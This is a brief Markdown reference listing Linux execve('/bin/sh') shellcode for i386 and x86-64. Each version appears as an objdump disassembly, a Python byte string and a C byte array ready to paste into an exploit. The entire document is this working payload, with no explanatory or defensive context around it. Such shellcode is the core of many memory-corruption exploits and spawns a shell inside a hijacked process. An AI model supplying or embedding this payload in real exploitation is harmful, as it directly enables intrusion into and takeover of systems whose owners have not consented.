# shell code for execve on Linux

# i386

```asm
./shellcode.i386.elf:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       50                      push   %eax
 8048063:       68 6e 2f 73 68          push   $0x68732f6e
 8048068:       68 2f 2f 62 69          push   $0x69622f2f
 804806d:       89 e3                   mov    %esp,%ebx
 804806f:       50                      push   %eax
 8048070:       53                      push   %ebx
 8048071:       89 e1                   mov    %esp,%ecx
 8048073:       b0 0b                   mov    $0xb,%al
 8048075:       cd 80                   int    $0x80

```

```python
SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```c
unsigned char shellcode_i386_bin[] = {
  0x31, 0xc0, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x2f, 0x62,
  0x69, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
};
unsigned int shellcode_i386_bin_len = 23;
```

# x64

```asm
./shellcode.x64.elf:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:       48 31 d2                xor    %rdx,%rdx
  400083:       48 bb 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rbx
  40008a:       2f 73 68
  40008d:       48 c1 eb 08             shr    $0x8,%rbx
  400091:       53                      push   %rbx
  400092:       54                      push   %rsp
  400093:       5f                      pop    %rdi
  400094:       52                      push   %rdx
  400095:       57                      push   %rdi
  400096:       54                      push   %rsp
  400097:       5e                      pop    %rsi
  400098:       52                      push   %rdx
  400099:       58                      pop    %rax
  40009a:       b0 3b                   mov    $0x3b,%al
  40009c:       0f 05                   syscall
```

```python
SHELL_CODE="\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x52\x57\x54\x5e\x52\x58\xb0\x3b\x0f\x05"
```

```c
unsigned char shellcode_x64_bin[] = {
  0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e,
  0x52, 0x58, 0xb0, 0x3b, 0x0f, 0x05
};
unsigned int shellcode_x64_bin_len = 30;
```


